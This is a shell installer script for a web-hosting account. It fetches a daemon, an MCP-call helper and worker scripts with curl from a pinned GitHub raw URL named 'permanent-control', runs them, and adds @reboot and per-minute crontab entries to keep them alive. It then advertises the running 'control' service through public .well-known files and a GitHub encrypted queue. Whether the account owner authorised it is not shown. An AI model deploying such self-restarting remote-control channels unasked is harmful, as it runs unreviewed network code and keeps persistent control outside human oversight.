#!/bin/sh
set -eu
umask 077

ACCOUNT="/home/storage/781/4477781/user"
WEBAPP="$ACCOUNT/webapp"
HTDOCS="$ACCOUNT/htdocs"
STATE="$ACCOUNT/.powerpc-control-v1"
WORKER_STATE="$ACCOUNT/.powerpc-control-workers"
BIN="$WEBAPP/bin/powerpc-control"
WORKER_BIN="$WEBAPP/bin/powerpc-control-workers"
PIN="784090634eaf9ebcd4c417793952a1477f0dd80d"
BASE="https://raw.githubusercontent.com/Christopher-Charman/open-webui/$PIN/bootstrap-relay/permanent-control"

[ "$(id -u)" = "2257347" ] || { echo "REFUSED unexpected uid=$(id -u)" >&2; exit 2; }
[ -d "$WEBAPP" ] && [ -d "$HTDOCS" ] || { echo "REFUSED canonical runtime paths missing" >&2; exit 2; }
[ -x "$WEBAPP/bin/local-mcp" ] || { echo "REFUSED local MCP missing" >&2; exit 2; }
[ -x "$WEBAPP/.local/node22-glibc217/bin/node" ] || { echo "REFUSED Node22 missing" >&2; exit 2; }

PY=""
for p in "$WEBAPP/miniconda/bin/python3.12" "$WEBAPP/miniconda/bin/python3" "$WEBAPP/envs/open-terminal/bin/python"; do
  if [ -x "$p" ]; then PY="$p"; break; fi
done
[ -n "$PY" ] || { echo "REFUSED Python missing" >&2; exit 2; }
"$PY" -c 'import cryptography,sqlite3' >/dev/null 2>&1 || { echo "REFUSED cryptography/sqlite unavailable" >&2; exit 2; }

mkdir -p "$STATE" "$WORKER_STATE" "$HTDOCS/.well-known/powerpc-control-v1/results" "$WEBAPP/bin"
chmod 700 "$STATE" "$WORKER_STATE"

fetch_private() {
  url="$1"
  dest="$2"
  tmp="$dest.tmp.$$"
  curl -fsSL --retry 4 "$url" -o "$tmp"
  chmod 700 "$tmp"
  mv -f "$tmp" "$dest"
}

fetch_private "$BASE/daemon.py" "$STATE/daemon.py"
fetch_private "$BASE/local-mcp-call.mjs" "$STATE/local-mcp-call.mjs"
fetch_private "$BASE/powerpc-control-service" "$BIN"
fetch_private "$BASE/control-plane-workers.py" "$WORKER_STATE/control-plane-workers.py"
fetch_private "$BASE/powerpc-control-workers-service" "$WORKER_BIN"

"$PY" -m py_compile "$STATE/daemon.py" "$WORKER_STATE/control-plane-workers.py"
"$WEBAPP/.local/node22-glibc217/bin/node" --check "$STATE/local-mcp-call.mjs"
sh -n "$BIN"
sh -n "$WORKER_BIN"

MARK_CONTROL="# POWERPC_CONTROL_V1"
MARK_WORKERS="# POWERPC_CONTROL_WORKERS_V1"
TMP="$STATE/crontab.$$"
(crontab -l 2>/dev/null || true) | awk   -v a="$MARK_CONTROL"   -v b="$MARK_WORKERS"   '$0 !~ a && $0 !~ b {print}' >"$TMP"

printf '%s\n'   "@reboot $BIN ensure >/dev/null 2>&1 $MARK_CONTROL"   "* * * * * $BIN ensure >/dev/null 2>&1 $MARK_CONTROL"   "@reboot $WORKER_BIN ensure >/dev/null 2>&1 $MARK_WORKERS"   "* * * * * $WORKER_BIN ensure >/dev/null 2>&1 $MARK_WORKERS"   >>"$TMP"

crontab "$TMP"
rm -f "$TMP"

"$BIN" start
"$WORKER_BIN" start

IDENTITY="$HTDOCS/.well-known/powerpc-control-v1/identity.json"
STATUS="$HTDOCS/.well-known/powerpc-control-v1/status.json"
deadline=$(( $(date +%s) + 40 ))
while [ "$(date +%s)" -lt "$deadline" ]; do
  control_ok=0
  workers_ok=0
  if [ -s "$IDENTITY" ] && [ -s "$STATUS" ] && "$BIN" status >/dev/null 2>&1; then
    control_ok=1
  fi
  if "$WORKER_BIN" status >/dev/null 2>&1; then
    workers_ok=1
  fi
  if [ "$control_ok" = 1 ] && [ "$workers_ok" = 1 ]; then
    fp="$("$PY" -c 'import json,sys;print(json.load(open(sys.argv[1]))["identity_fingerprint"])' "$IDENTITY")"
    echo "POWERPC_CONTROL_V1=READY"
    echo "identity_fingerprint=$fp"
    echo "identity_url=https://www.powerpc-darwin.org/.well-known/powerpc-control-v1/identity.json"
    echo "status_url=https://www.powerpc-darwin.org/.well-known/powerpc-control-v1/status.json"
    echo "transport=GITHUB_ENCRYPTED_QUEUE"
    echo "control_supervision=CRON_ENSURE_DETACHED"
    echo "worker_supervision=CRON_ENSURE_DETACHED"
    "$WORKER_BIN" status || true
    exit 0
  fi
  sleep 1
done

echo "POWERPC_CONTROL_V1=FAIL" >&2
"$BIN" status 2>&1 || true
"$WORKER_BIN" status 2>&1 || true
tail -n 80 "$STATE/service.log" "$STATE/daemon.log" "$WORKER_STATE/service.log" "$WORKER_STATE/supervisor.log" 2>/dev/null || true
exit 1
